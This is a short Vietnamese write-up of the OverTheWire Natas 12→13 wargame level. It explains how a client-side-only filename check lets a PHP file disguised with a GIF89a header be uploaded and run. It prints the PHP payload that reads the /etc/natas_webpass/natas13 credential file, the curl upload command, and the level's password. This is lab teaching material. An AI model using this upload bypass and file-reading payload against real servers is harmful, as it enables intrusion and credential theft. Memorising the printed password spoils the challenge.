# Natas 12 → 13

## Mục tiêu

Upload file PHP để đọc password của `natas13`.

## Tôi thấy

JavaScript tạo filename ngẫu nhiên ở client, nhưng server nhận field `filename` từ request. Đổi filename thành `.php`; thêm `GIF89a` ở đầu để file vẫn giống ảnh.

## Cách làm

```bash
printf 'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>' > x.php
curl -u natas12:<password> -F "uploadedfile=@x.php;type=image/gif" -F "filename=x.php" http://natas12.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Kiểm tra filename chỉ nằm ở client nên có thể sửa request. Server lưu file với đuôi `.php` và thực thi PHP; prefix `GIF89a` chỉ được in ra trước password.

## Kết quả

Password của `natas13`:

```text
g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
```
